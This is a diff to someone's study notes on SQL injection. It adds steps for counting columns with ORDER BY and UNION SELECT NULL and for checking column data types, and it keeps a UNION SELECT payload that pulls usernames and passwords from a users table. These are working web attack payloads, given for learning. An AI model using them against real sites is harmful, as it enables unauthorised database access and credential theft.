@@ -26,14 +26,25 @@ when the attacker uses the same communication channel to both launch the attack 
 
     - the number and order of columns must be the same in all queries, data type must be the same
     - to determine the column (use ORDER BY, use NULL VALUES)
+
+- to check the number of columns
     `' ORDER by 3 --  (some doesn't accept -- so we can use #)`
     `' ORDER by 3 # (to url encode, CTRL+U)`
-- 'ORDER+by+2%23 if 200 okay, 2 columns present
-- 'ORDER+by+3%23 if 500 internal server error, 3rd column not present
+    - 'ORDER+by+2%23 if 200 okay, 2 columns present
+    - 'ORDER+by+3%23 if 500 internal server error, 3rd column not present (3-1=2 colums only)
+
+    - another method
+        UNION SELECT NULL , if error incorrect no. of column
+        UNION SELECT NULL, NULL ,if 200 okay , 2 columns
+
+- to check if data type is same, `' UNION SELECT 'a', 'a'#`
+    this checks if data type of 1st column is text , and 2nd column is also text.
+
+
 
 
     `www.test.com/app.php?id=' UNION SELECT username, password FROM users--`
-    we did'n give id so it's emprt
+    we did'nt give id so it's empty
     `output:ac1, passw1, adm1, pass2`
 
 2. Interential(Blind) 
